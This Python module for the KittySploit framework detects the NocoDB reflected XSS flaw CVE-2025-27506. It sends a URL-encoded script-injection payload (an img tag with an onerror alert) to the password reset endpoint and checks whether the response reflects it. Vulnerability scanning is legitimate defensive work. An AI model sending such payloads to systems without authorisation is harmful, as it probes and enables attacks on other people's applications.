#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""NocoDB versions before 0."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'NocoDB < 0.258.0 - Reflected XSS in Password Reset Detection',
        'description': "NocoDB versions before 0.258.0 contain a reflected cross-site scripting caused by insecure use of '\\u003C%-' in resetPassword.ts, letting attackers execute malicious scripts in victims' browsers, exploit requires sending crafted requests to /api/v1/db/auth/password/reset/:tokenId.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'nocodb', 'xss', 'reflected', 'unauth'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/nocodb/nocodb/security/advisories/GHSA-wf6c-hrhf-86cw',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-27506',
            'https://github.com/nocodb/nocodb/commit/ea821edb133e621e26183ae65c8ff9ee5d6f2723',
        ],
        'cve': 'CVE-2025-27506',
    }

    def run(self):
        r = self.http_request(method="GET", path='/api/v1/db/auth/password/reset/nuclei%3C%2Fscript%3E%3Cimg%20src%3Dx%20onerror%3Dalert%28document.domain%29%3E/', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('text/html',)
        body_all = ('NocoDB - Reset Password', 'onerror=alert(document.domain)>', 'token:',)
        if (any(m in body for m in body_any)) and (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="NocoDB < 0.258.0 - Reflected XSS in Password Reset detected",
                path='/api/v1/db/auth/password/reset/nuclei%3C%2Fscript%3E%3Cimg%20src%3Dx%20onerror%3Dalert%28document.domain%29%3E/',
            )
            return True
        return False

